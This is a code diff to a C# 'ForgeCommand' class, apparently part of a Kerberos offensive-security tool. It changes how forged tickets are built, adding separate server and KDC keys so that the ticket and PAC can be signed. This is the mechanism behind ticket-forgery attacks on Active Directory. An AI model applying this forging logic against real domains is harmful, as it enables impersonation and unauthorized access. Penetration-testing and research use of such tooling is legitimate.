@@ -26,8 +26,16 @@ public class ForgeCommand : TicketRequestCommand
 
 	[Parameter]
 	[Mandatory]
-	[Description("Key to encrypt ticket with")]
-	public HexString TicketKey { get; set; }
+	[Description("Key of server to receive the ticket")]
+	public HexString ServerKey { get; set; }
+
+	[Parameter]
+	[Description("KDC key type")]
+	public EType KdcEType { get; set; }
+
+	[Parameter]
+	[Description("Key to sign the ticket and PAC with")]
+	public HexString KdcKey { get; set; }
 
 	[Parameter(0)]
 	[Mandatory]
@@ -178,7 +186,8 @@ public class ForgeCommand : TicketRequestCommand
 
 		const KdcOptions options = KdcOptions.Canonicalize | KdcOptions.Preauthenticated | KdcOptions.Initial | KdcOptions.Renewable | KdcOptions.Forwardable;
 
-		SessionKey ticketKey = krb.GetEncProfile(this.TicketEType).CreateSessionKey(this.TicketKey.Bytes);
+		SessionKey serverKey = krb.GetEncProfile(this.TicketEType).CreateSessionKey(this.ServerKey.Bytes);
+		SessionKey? kdcKey = (this.KdcKey != null) ? krb.GetEncProfile(this.KdcEType).CreateSessionKey(this.KdcKey.Bytes) : null;
 
 		DateTime authTime = (DateTime.UtcNow - TimeSpan.FromSeconds(89)).RoundSeconds();
 		DateTime startTime = authTime;
@@ -267,14 +276,14 @@ public class ForgeCommand : TicketRequestCommand
 				target,
 				serviceRealm,
 				sessionKey,
-				ticketKey,
+				serverKey,
 				authTime,
 				endTime,
 				startTime,
 				renewTill,
 				logonInfo,
 				upnDnsInfo,
-				null
+				kdcKey
 				);
 			tickets.Add(forged);
 		}
